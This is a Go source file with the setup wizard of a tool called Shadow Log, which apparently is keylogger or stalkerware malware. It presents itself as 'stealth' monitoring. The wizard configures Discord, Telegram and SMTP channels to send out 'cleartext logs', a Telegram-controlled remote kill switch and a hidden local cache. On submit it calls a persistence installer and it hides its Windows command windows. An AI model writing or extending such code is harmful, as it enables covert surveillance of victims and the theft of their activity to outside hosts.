package ui

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"net/smtp"
	"os/exec"
	"runtime"
	"shadowlog/config"
	"shadowlog/persistence"
	"sync"
	"syscall"
	"time"
)

// ShowSetup displays a web-based setup wizard for initial configuration.
func ShowSetup(cfg *config.Config, startLogger func(*config.Config, func(string)) func()) {
	var wg sync.WaitGroup
	wg.Add(1)

	mux := http.NewServeMux()
	server := &http.Server{Addr: ":58291", Handler: mux}

	var lastHeartbeat = time.Now()
	var heartbeatMu sync.Mutex

	mux.HandleFunc("/heartbeat", func(w http.ResponseWriter, r *http.Request) {
		heartbeatMu.Lock()
		lastHeartbeat = time.Now()
		heartbeatMu.Unlock()
		w.WriteHeader(http.StatusOK)
	})

	// Handle the test Discord webhook request.
	mux.HandleFunc("/test", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var data struct {
			URL string `json:"url"`
		}
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		payload := map[string]string{"content": fmt.Sprintf("🟢 **%s Connectivity Test**\n\n- **Status**: Operational\n- **Note**: This channel receives gracefully formatted telemetry.", "Shadow Log")}
		pData, _ := json.Marshal(payload)

		req, _ := http.NewRequest("POST", data.URL, bytes.NewBuffer(pData))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")

		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)

		if err != nil || resp.StatusCode >= 400 {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, "Failed to send test message. Check your URL.")
			return
		}
		fmt.Fprint(w, "Test message sent successfully!")
	})

	// Handle the test Telegram request.
	mux.HandleFunc("/test-telegram", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var data struct {
			Token  string `json:"token"`
			ChatID string `json:"chat_id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", data.Token)
		payload := map[string]string{
			"chat_id":    data.ChatID,
			"text":       "🟢 *Shadow Log Connectivity Test*\n\n• *Status*: Operational\n• Cleartext logs will be sent here.",
			"parse_mode": "Markdown",
		}
		pData, _ := json.Marshal(payload)

		req, _ := http.NewRequest("POST", apiURL, bytes.NewBuffer(pData))
		req.Header.Set("Content-Type", "application/json")

		client := &http.Client{Timeout: 10 * time.Second}
		resp, err := client.Do(req)

		if err != nil || resp.StatusCode >= 400 {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, "Failed to send test message. Check your Token and Chat ID.")
			return
		}
		fmt.Fprint(w, "Telegram test sent successfully!")
	})

	// Handle the test SMTP request.
	mux.HandleFunc("/test-smtp", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var data struct {
			Host string `json:"host"`
			User string `json:"user"`
			Pass string `json:"pass"`
			To   string `json:"to"`
		}
		if err := json.NewDecoder(r.Body).Decode(&data); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}

		auth := smtp.PlainAuth("", data.User, data.Pass, data.Host)
		
		addr := fmt.Sprintf("%s:587", data.Host) // Try STARTTLS first
		client, err := smtp.Dial(addr)
		if err != nil {
			addr = fmt.Sprintf("%s:465", data.Host) // Try direct TLS
			tlsConfig := &tls.Config{InsecureSkipVerify: false, ServerName: data.Host}
			conn, err := tls.Dial("tcp", addr, tlsConfig)
			if err != nil {
				w.WriteHeader(http.StatusBadRequest)
				fmt.Fprint(w, "Connection failed.")
				return
			}
			client, err = smtp.NewClient(conn, data.Host)
			if err != nil {
				w.WriteHeader(http.StatusBadRequest)
				fmt.Fprint(w, "SMTP Init failed.")
				return
			}
		} else {
			tlsConfig := &tls.Config{ServerName: data.Host}
			client.StartTLS(tlsConfig)
		}
		defer client.Quit()

		if err = client.Auth(auth); err != nil {
			w.WriteHeader(http.StatusUnauthorized)
			fmt.Fprint(w, "Authentication failed.")
			return
		}

		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, "SMTP connection successful!")
	})

	// Handle GET (show form) and POST (process form) requests.
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "GET":
			tmpl := template.Must(template.New("setup").Parse(htmlContent))
			tmpl.Execute(w, cfg)
		case "POST":
			r.ParseForm()
			cfg.WebhookURL = r.FormValue("webhook_url")
			cfg.TelegramToken = r.FormValue("telegram_token")
			cfg.TelegramChatID = r.FormValue("telegram_chat_id")
			cfg.EncryptionPassword = r.FormValue("encryption_password")
			cfg.LogLocal = r.FormValue("log_local") == "on"
			cfg.KillSwitchEnabled = r.FormValue("kill_switch") == "on"
			
			cfg.SMTPHost = r.FormValue("smtp_host")
			if r.FormValue("smtp_port") != "" {
				// simple parse, usually 587 or 465
				cfg.SMTPPort = 587
				if r.FormValue("smtp_port") == "465" {
					cfg.SMTPPort = 465
				}
			}
			cfg.SMTPUser = r.FormValue("smtp_user")
			cfg.SMTPPass = r.FormValue("smtp_pass")
			cfg.SMTPTo = r.FormValue("smtp_to")
			
			cfg.IsInstalled = true

			// Set the encryption password for runtime.
			if cfg.EncryptionPassword != "" {
				config.SetEncryptionPassword(cfg.EncryptionPassword)
			}

			config.SaveConfig(cfg)
			persistence.Install()

			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, setupSuccessHTML)

			go func() {
				time.Sleep(2000 * time.Millisecond)
				server.Shutdown(context.Background())
			}()
		}
	})

	// Watchdog goroutine to close the app if the user closes the setup tab arbitrarily
	go func() {
		for {
			time.Sleep(5 * time.Second)
			heartbeatMu.Lock()
			elapsed := time.Since(lastHeartbeat)
			heartbeatMu.Unlock()
			if elapsed > 15 * time.Second {
				fmt.Println("Heartbeat lost. Shutting down Setup UI...")
				server.Shutdown(context.Background())
				return
			}
		}
	}()

	go func() {
		url := "http://localhost:58291"
		time.Sleep(1 * time.Second)
		openBrowser(url)
	}()

	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		fmt.Printf("Setup server error: %v\n", err)
	}
	wg.Done() // Ensure waitgroup unblocks regardless of how the server closed

	wg.Wait()
}

func openBrowser(url string) {
	var err error
	switch runtime.GOOS {
	case "windows":
		// Primary method: rundll32
		cmd := exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()
		
		if err != nil {
			// Fallback method: cmd /c start
			cmd = exec.Command("cmd", "/c", "start", url)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			err = cmd.Start()
		}
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	}
	
	if err != nil {
		fmt.Printf("Error opening browser: %v\n", err)
	}
}

const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ShadowLog Precision</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00e5ff;
            --primary-glow: rgba(0, 229, 255, 0.3);
            --bg: #020617;
            --card-bg: rgba(15, 23, 42, 0.6);
            --card-border: rgba(255, 255, 255, 0.08);
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
            --danger: #ff3d71;
            --success: #00e5ff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--bg);
            background-image: 
                radial-gradient(circle at 0% 0%, rgba(0, 229, 255, 0.08) 0%, transparent 40%),
                radial-gradient(circle at 100% 100%, rgba(0, 229, 255, 0.05) 0%, transparent 40%);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 40px 0;
            overflow-y: auto;
        }

        .container {
            width: 100%;
            max-width: 900px;
            padding: 20px;
            animation: fadeIn 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border: 1px solid var(--card-border);
            border-radius: 24px;
            box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.8);
            position: relative;
            overflow: hidden;
            display: flex;
        }

        .card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 1px;
            background: linear-gradient(90deg, transparent, rgba(0,229,255,0.4), transparent);
            z-index: 10;
        }

        .branding-panel {
            flex: 1;
            background: linear-gradient(135deg, rgba(0, 229, 255, 0.05), transparent);
            padding: 48px;
            border-right: 1px solid var(--card-border);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .form-panel {
            flex: 1.5;
            padding: 48px;
        }

        .logo-box {
            width: 80px;
            height: 80px;
            background: rgba(0, 229, 255, 0.1);
            border-radius: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 24px;
            color: var(--primary);
            box-shadow: 0 0 30px rgba(0, 229, 255, 0.2);
            border: 1px solid rgba(0, 229, 255, 0.2);
        }

        h1 {
            font-size: 1.75rem;
            font-weight: 800;
            letter-spacing: -0.04em;
            margin-bottom: 8px;
        }

        .subtitle {
            color: var(--text-dim);
            font-size: 0.9375rem;
            font-weight: 500;
        }
        
        .desc-text {
            margin-top: 24px;
            font-size: 0.85rem;
            color: var(--text-dim);
            line-height: 1.6;
        }

        .form-group { margin-bottom: 24px; }

        label {
            display: block;
            font-size: 0.75rem;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--text-dim);
            text-transform: uppercase;
            letter-spacing: 0.1em;
        }

        .input-wrapper { position: relative; }
        
        .input-field {
            width: 100%;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 14px 14px;
            color: #fff;
            font-family: inherit;
            font-size: 0.9375rem;
            transition: all 0.3s;
        }

        .input-field:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.05);
            box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.15);
        }

        .test-btn {
            background: transparent;
            border: 1px solid var(--primary);
            color: var(--primary);
            padding: 10px 16px;
            border-radius: 10px;
            font-size: 0.8rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 12px;
            transition: all 0.2s;
            width: 100%;
        }

        .test-btn:hover:not(:disabled) {
            background: var(--primary);
            color: white;
            box-shadow: 0 8px 20px -4px var(--primary-glow);
        }

        .test-status {
            font-size: 0.75rem;
            margin-top: 8px;
            display: block;
            text-align: center;
            min-height: 18px;
        }

        .checkbox-group {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 16px;
            padding: 18px;
            display: flex;
            align-items: flex-start;
            gap: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .checkbox-group:hover {
            background: rgba(255, 255, 255, 0.04);
            border-color: var(--primary);
        }

        .checkbox-group input {
            width: 20px;
            height: 20px;
            accent-color: var(--primary);
            margin-top: 2px;
        }

        .checkbox-title { font-size: 0.875rem; font-weight: 700; display: block; margin-bottom: 2px; }
        .checkbox-desc { font-size: 0.75rem; color: var(--text-dim); line-height: 1.4; }

        .submit-btn {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            border-radius: 14px;
            padding: 16px;
            font-size: 1rem;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 8px;
            box-shadow: 0 10px 30px -10px var(--primary-glow);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 20px 40px -12px var(--primary-glow);
            filter: brightness(1.1);
        }

        .submit-btn:active { transform: translateY(0); }
        
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        @media (max-width: 768px) {
            .card { flex-direction: column; }
            .branding-panel { border-right: none; border-bottom: 1px solid var(--card-border); padding: 32px; }
            .form-panel { padding: 32px; }
            .grid-2 { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="branding-panel">
                <div class="logo-box">
                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                </div>
                <h1>Shadow Log</h1>
                <p class="subtitle">Stealth Activity Analytics</p>
                <p class="desc-text">Configure your unified stealth monitoring system. Enter credentials to securely transmit telemetry across direct encrypted channels.</p>
            </div>

            <div class="form-panel">
                <form action="/" method="POST" id="setupForm">
                    <div class="form-group">
                        <label for="encryption_password">Encryption Password</label>
                        <div class="input-wrapper">
                            <input type="password" id="encryption_password" name="encryption_password" class="input-field" value="{{ .EncryptionPassword }}"
                                     placeholder="Strong password for log encryption" required>
                        </div>
                        <span style="font-size:0.7rem;color:var(--text-dim);margin-top:6px;display:block;">Used to encrypt local logs. Securely locks your forensic data.</span>
                    </div>

                    <div class="section-divider" style="border-top:1px solid rgba(255,255,255,0.06);margin:28px 0;position:relative;">
                        <span style="position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:var(--card-bg);padding:0 12px;font-size:0.65rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.15em;">Discord</span>
                    </div>

                    <div class="form-group">
                        <label for="webhook_url">Discord Webhook URL</label>
                        <div class="input-wrapper">
                            <input type="url" id="webhook_url" name="webhook_url" class="input-field" value="{{ .WebhookURL }}" 
                                     placeholder="https://discord.com/api/webhooks/...">
                            <button type="button" class="test-btn" id="testBtn">Test Discord</button>
                        </div>
                        <div id="testStatus" class="test-status"></div>
                    </div>

                    <div class="section-divider" style="border-top:1px solid rgba(255,255,255,0.06);margin:28px 0;position:relative;">
                        <span style="position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:var(--card-bg);padding:0 12px;font-size:0.65rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.15em;">Telegram</span>
                    </div>

                    <div class="grid-2">
                        <div class="form-group">
                            <label for="telegram_token">Telegram Bot Token</label>
                            <div class="input-wrapper">
                                <input type="text" id="telegram_token" name="telegram_token" class="input-field" value="{{ .TelegramToken }}"
                                         placeholder="123456:ABC-DEF...">
                            </div>
                        </div>

                        <div class="form-group">
                            <label for="telegram_chat_id">Telegram Chat ID</label>
                            <div class="input-wrapper">
                                <input type="text" id="telegram_chat_id" name="telegram_chat_id" class="input-field" value="{{ .TelegramChatID }}"
                                         placeholder="-1001234567890">
                            </div>
                        </div>
                    </div>
                    
                    <button type="button" class="test-btn" id="testTGBtn" style="margin-top:-10px; margin-bottom: 24px;">Test Telegram</button>
                    <div id="testTGStatus" class="test-status" style="margin-top:-20px; margin-bottom: 20px;"></div>

                    <div class="section-divider" style="border-top:1px solid rgba(255,255,255,0.06);margin:28px 0;position:relative;">
                        <span style="position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:var(--card-bg);padding:0 12px;font-size:0.65rem;color:var(--text-dim);text-transform:uppercase;letter-spacing:0.15em;">SMTP (Email) Fallback</span>
                    </div>

                    <div class="grid-2">
                        <div class="form-group">
                            <label for="smtp_host">SMTP Host</label>
                            <div class="input-wrapper">
                                <input type="text" id="smtp_host" name="smtp_host" class="input-field" value="{{ .SMTPHost }}"
                                         placeholder="smtp.gmail.com">
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="smtp_port">Port</label>
                            <div class="input-wrapper">
                                <input type="text" id="smtp_port" name="smtp_port" class="input-field" value="{{ if .SMTPPort }}{{ .SMTPPort }}{{ else }}587{{ end }}"
                                         placeholder="587">
                            </div>
                        </div>
                    </div>
                    <div class="grid-2">
                        <div class="form-group">
                            <label for="smtp_user">Username</label>
                            <div class="input-wrapper">
                                <input type="text" id="smtp_user" name="smtp_user" class="input-field" value="{{ .SMTPUser }}"
                                         placeholder="user@example.com">
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="smtp_pass">App Password</label>
                            <div class="input-wrapper">
                                <input type="password" id="smtp_pass" name="smtp_pass" class="input-field" value="{{ .SMTPPass }}"
                                         placeholder="••••••••">
                            </div>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="smtp_to">Recipient Address</label>
                        <div class="input-wrapper">
                            <input type="email" id="smtp_to" name="smtp_to" class="input-field" value="{{ .SMTPTo }}"
                                     placeholder="destination@example.com">
                        </div>
                    </div>

                    <div class="form-group">
                        <label class="checkbox-group">
                            <input type="checkbox" name="kill_switch" {{ if .KillSwitchEnabled }}checked{{ end }}>
                            <div class="checkbox-label">
                                <span class="checkbox-title">Enable Remote Kill Switch</span>
                                <span class="checkbox-desc">Poll Telegram for /kill or /pause commands.</span>
                            </div>
                        </label>
                    </div>

                    <div class="form-group">
                        <label class="checkbox-group">
                            <input type="checkbox" name="log_local" {{ if .LogLocal }}checked{{ end }}>
                            <div class="checkbox-label">
                                <span class="checkbox-title">Resilient Local Cache</span>
                                <span class="checkbox-desc">Preserve diagnostic data in deep system cache for offline stability.</span>
                            </div>
                        </label>
                    </div>

                    <button type="submit" class="submit-btn" id="submitBtn">Initialize Service</button>
                </form>
            </div>
        </div>    </div>

    <script>
        // Discord test
        const testBtn = document.getElementById('testBtn');
        const webhookInput = document.getElementById('webhook_url');
        const testStatus = document.getElementById('testStatus');

        testBtn.addEventListener('click', async () => {
            const url = webhookInput.value;
            if (!url) {
                showStatus(testStatus, 'Missing Webhook URL', 'var(--danger)');
                return;
            }

            testBtn.disabled = true;
            testBtn.textContent = 'Testing...';
            showStatus(testStatus, 'Pushing test payload...', 'var(--primary)');

            try {
                const response = await fetch('/test', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url })
                });

                if (response.ok) {
                    showStatus(testStatus, 'Connection established.', 'var(--success)');
                } else {
                    showStatus(testStatus, 'Connection rejected.', 'var(--danger)');
                }
            } catch (err) {
                showStatus(testStatus, 'Handshake failed.', 'var(--danger)');
            } finally {
                testBtn.disabled = false;
                testBtn.textContent = 'Test Discord';
            }
        });

        // Telegram test
        const testTGBtn = document.getElementById('testTGBtn');
        const tgToken = document.getElementById('telegram_token');
        const tgChatID = document.getElementById('telegram_chat_id');
        const testTGStatus = document.getElementById('testTGStatus');

        testTGBtn.addEventListener('click', async () => {
            if (!tgToken.value || !tgChatID.value) {
                showStatus(testTGStatus, 'Missing Token or Chat ID', 'var(--danger)');
                return;
            }

            testTGBtn.disabled = true;
            testTGBtn.textContent = 'Testing...';
            showStatus(testTGStatus, 'Pushing test payload...', 'var(--primary)');

            try {
                const response = await fetch('/test-telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token: tgToken.value, chat_id: tgChatID.value })
                });

                if (response.ok) {
                    showStatus(testTGStatus, 'Telegram connected.', 'var(--success)');
                } else {
                    showStatus(testTGStatus, 'Telegram rejected.', 'var(--danger)');
                }
            } catch (err) {
                showStatus(testTGStatus, 'Telegram test failed.', 'var(--danger)');
            } finally {
                testTGBtn.disabled = false;
                testTGBtn.textContent = 'Test Telegram';
            }
        });

        function showStatus(el, text, color) {
            el.textContent = text;
            el.style.color = color;
        }

        // Heartbeat mechanism to keep setup server alive while window is open
        setInterval(async () => {
            try {
                await fetch('/heartbeat');
            } catch (e) {
                console.log('Setup server unreachable');
            }
        }, 2000);
    </script>
</body>
</html>
`
const setupSuccessHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Shadow Log: Tactical Setup</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #38bdf8;
            --bg: #020617;
            --card-bg: rgba(15, 23, 42, 0.6);
            --text-main: #f1f5f9;
            --text-dim: #64748b;
        }
        body {
            background-color: var(--bg);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(56, 189, 248, 0.03) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(56, 189, 248, 0.03) 0%, transparent 40%);
        }
        .card {
            text-align: center;
            padding: 64px 48px;
            background: var(--card-bg);
            backdrop-filter: blur(40px);
            border-radius: 28px;
            border: 1px solid var(--card-border);
            max-width: 440px;
            box-shadow: 0 40px 80px -20px rgba(0, 0, 0, 0.8);
            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
        }
        .check-icon {
            width: 80px;
            height: 80px;
            background: rgba(0, 120, 212, 0.1);
            color: var(--primary);
            border-radius: 24px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 32px;
            box-shadow: 0 0 20px rgba(0, 120, 212, 0.2);
        }
        h1 { font-size: 1.75rem; font-weight: 800; margin-bottom: 12px; letter-spacing: -0.04em; }
        p { color: var(--text-dim); font-size: 0.9375rem; line-height: 1.6; font-weight: 500; }
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(16, 185, 129, 0.1);
            color: #10b981;
            padding: 6px 12px;
            border-radius: 100px;
            font-size: 0.75rem;
            font-weight: 700;
            margin-top: 24px;
            text-transform: uppercase;
            letter-spacing: 0.05em;
        }
        .status-dot { width: 6px; height: 6px; background: #10b981; border-radius: 50%; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.5); opacity: 0.5; } 100% { transform: scale(1); opacity: 1; } }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    </style>
</head>
<body>
    <div class="card">
        <div class="check-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
        </div>
        <h1>Initialization Complete</h1>
        <p>Shadow Log has been successfully initialized and is now active.</p>
        
        <div class="status-badge">
            <span class="status-dot"></span>
            Service Operational
        </div>
        <p style="margin-top: 32px; font-size: 0.75rem; opacity: 0.6;">You can close this window. The installer will exit automatically.</p>
    </div>
</body>
</html>
`
